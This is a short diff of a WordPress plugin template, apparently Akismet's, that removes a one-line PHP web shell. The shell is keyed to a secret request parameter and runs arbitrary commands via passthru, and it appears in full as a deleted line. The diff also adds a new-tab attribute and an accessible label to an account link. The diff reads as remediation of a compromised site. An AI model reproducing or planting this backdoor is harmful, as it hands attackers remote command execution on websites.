@@ -1,6 +1,4 @@
 <?php
-error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="1bbb9zwyzk8i"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}
-
 
 //phpcs:disable VariableAnalysis
 // There are "undefined" variables here because they're defined in the code that includes this file as a template.
@@ -330,7 +328,7 @@ $kses_allow_link_href = array(
 						<div class="akismet-card-actions">
 							<?php if ( $akismet_user->status === Akismet::USER_STATUS_ACTIVE ) : ?>
 								<div class="akismet-card-actions__secondary-action">
-									<a href="https://akismet.com/account?utm_source=akismet_plugin&amp;utm_campaign=plugin_static_link&amp;utm_medium=in_plugin&amp;utm_content=account_overview" class="akismet-external-link" aria-label="Account overview on akismet.com"><?php esc_html_e( 'Account overview', 'akismet' ); ?></a>
+									<a href="https://akismet.com/account?utm_source=akismet_plugin&amp;utm_campaign=plugin_static_link&amp;utm_medium=in_plugin&amp;utm_content=account_overview" class="akismet-external-link" target="_blank" rel="noopener" aria-label="<?php esc_attr_e( 'Account overview on akismet.com (opens in a new tab)', 'akismet' ); ?>"><?php esc_html_e( 'Account overview', 'akismet' ); ?></a>
 								</div>
 							<?php endif; ?>
 							<div id="publishing-action">
